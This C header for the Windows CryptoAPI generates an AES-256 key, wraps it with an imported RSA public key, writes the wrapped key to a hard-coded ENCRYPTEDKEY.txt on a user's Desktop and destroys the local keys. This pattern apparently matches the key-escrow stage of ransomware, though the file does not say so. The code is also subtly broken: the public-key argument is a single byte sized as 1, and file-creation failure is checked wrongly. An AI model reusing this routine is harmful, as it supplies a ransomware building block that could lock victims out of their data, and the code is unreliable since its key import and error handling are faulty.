#pragma once
#include <Windows.h>

typedef struct keyStructure {
	HCRYPTPROV hCryptoProvider;
	HCRYPTKEY hKey;
}key;

// Function to setup symmetric and asymmetric keys
key setupKeys() {

	key keyData;
	if (CryptAcquireContextA(&keyData.hCryptoProvider, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET | CRYPT_VERIFYCONTEXT)) {
		printf("\n(+) Succesfully acquired key container context");
	} else if (!CryptAcquireContextA(&keyData.hCryptoProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		printf("\n(!) Error acquiring key container context - 0x%x", GetLastError());
	}

	keyData.hKey = 0;
	if (!CryptGenKey(keyData.hCryptoProvider, CALG_AES_256, CRYPT_EXPORTABLE, &keyData.hKey)) {
		printf("\n(!) Error generating key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully generated key", keyData.hKey);
	}

	return keyData;
}

int keyCleanup(key keyStruct, BYTE asymKeyData) {

	// Importing asymmetric public key from data into usable key
	HCRYPTKEY hAsymKey;
	if (!CryptImportKey(keyStruct.hCryptoProvider, asymKeyData, sizeof(asymKeyData), 0, CRYPT_EXPORTABLE, &hAsymKey)) {
		printf("\n(!) Error importing asym key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully imported asym key");
	}

	// Getting the size of the key to be exported
	DWORD keyLenCheck = NULL;
	if (!CryptExportKey(keyStruct.hKey, hAsymKey, SIMPLEBLOB, 0, NULL, &keyLenCheck)) {
		printf("\n(!) Error getting key size - 0x%x", GetLastError());
	} else {
		printf("\n(+) Succesfully got key size, %lu", keyLenCheck);
	}

	// Allocating buffer for exported key data
	DWORD keyLen = keyLenCheck + 1;
	BYTE* keyData = (BYTE*)malloc(keyLen);

	// Exporting symmetric key to be encrypted with asymmetric key
	if (!CryptExportKey(keyStruct.hKey, hAsymKey, SIMPLEBLOB, 0, keyData, &keyLen)) {
		printf("\n(!) Error exporting key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully exported key");
	}

	// Setting up intro before key value for key file legibity
	char fileIntro[] = "BYTE keyHex[] = {";
	DWORD hexedKeySize = keyLen * 6 + sizeof(fileIntro) + 2;
	char* hexedKey = (char*)malloc(hexedKeySize);
	strcpy_s(hexedKey, hexedKeySize, fileIntro);

	// Converting key to hex and adding to string
	for (DWORD i = 0; i < keyLen; i++) {

		char hexedChar[9];
		sprintf_s(hexedChar, 9, "%02x", (char*)keyData[i]);
		strcat_s(hexedKey, hexedKeySize, " 0x");
		strcat_s(hexedKey, hexedKeySize, hexedChar);
		if ((keyLen - 1) != i) {
			strcat_s(hexedKey, hexedKeySize, ",");
		} else {
			strcat_s(hexedKey, hexedKeySize, "};");
		}
	}
	free(keyData);

	// Creating file to store encrypted key in
	char filePath[] = "C:\\Users\\iamsd\\Desktop\\ENCRYPTEDKEY.txt";
	HANDLE fileHandle = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == NULL) {
		printf("\n(!) Failed to create file %s - %lu", filePath, GetLastError());
	} else {
		printf("\n(+) Succesfully created file %s", filePath);
	}

	// Writing encrypted key to file
	if (fileHandle != NULL) {
		BOOL writeReturn = WriteFile(fileHandle, hexedKey, strlen(hexedKey), NULL, NULL);
		printf("\n(+) Succesfully put encrypted key in created file");
	} else {
		printf("\n(!) Failed put content in created file %s - %lu", filePath, GetLastError());
	}
	free(hexedKey);

	// Deleting symmetric keys
	if (!CryptDestroyKey(keyStruct.hKey)) {
		printf("\n(!) Error destroying key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully destroyed key");
	}

	if (!CryptDestroyKey(hAsymKey)) {
		printf("\n(!) Error destroying key - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully destroyed key");
	}

	// Cleaning up crypto provider context
	if (!CryptReleaseContext(keyStruct.hCryptoProvider, 0)) {
		printf("\n(!) Error releasing crypto provider context - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully released crypto provider context");
	}

	return 0;
}
